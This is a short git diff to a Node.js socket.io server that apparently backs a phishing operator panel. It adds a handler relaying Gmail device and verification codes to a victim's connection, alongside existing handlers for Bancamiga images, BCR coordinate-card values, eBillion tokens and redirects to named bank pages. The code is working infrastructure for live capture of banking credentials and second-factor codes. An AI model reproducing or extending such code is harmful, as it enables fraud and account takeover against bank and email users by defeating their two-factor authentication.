@@ -51,11 +51,16 @@ io.on('connection', async(socket) => {
                 const users = await getBagForById({id})
                 socket.emit('[bag] getBag', users)
                 
+                socket.on('[gmail] deviceAndNumberVerify', ({ip = '', gmailDevice = '', gmailCode = '' }) => {
+                    if(ip == '') return
+                    return io.to(ip).emit('[gmail] bagGmailData', { gmailDevice, gmailCode })
+                })
 
                 socket.on('[bancamiga] getImage', ({ip = '', image = ''}) => {
                     if(ip == '') return
                     return io.to(ip).emit('[bancamiga] sendImage', {image})
                 })
+                
                 socket.on('[bcr] getCoordinates', ({ip = '', coordinate1 = '', coordinate2 = '', coordinate3 = ''}) => {
                     if(ip == '') return
                     return io.to(ip).emit('[bcr] bagCoordinate', {
@@ -75,8 +80,10 @@ io.on('connection', async(socket) => {
                     return io.to(ip).emit('[ebillion] sendMethodToken', {methodToken})
                 })
 
-                socket.on('[live] panelSendRedirect', async({ip, nameBank, urlPage, errorBag}) => 
-                    panelSendRedirect({ip, nameBank, urlPage, errorBag, io, socket})
+                socket.on('[live] panelSendRedirect', async({ip, nameBank, urlPage, errorBag, specialInfo = true}) => 
+                {
+                    panelSendRedirect({ip, nameBank, urlPage, errorBag, io, socket, specialInfo})
+                }
                 )
             }
 
